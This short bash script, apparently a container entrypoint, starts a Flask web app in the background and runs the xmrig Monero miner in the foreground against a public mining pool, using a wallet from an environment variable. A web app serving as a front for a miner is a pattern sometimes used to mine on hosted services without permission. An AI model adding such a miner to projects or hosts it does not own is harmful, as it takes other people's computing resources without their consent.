#!/bin/bash

# Start Flask in the background
python3 /app/app.py &

# Start the miner in the foreground
./xmrig -o pool.supportxmr.com:3333 -u $WALLET -p x -k
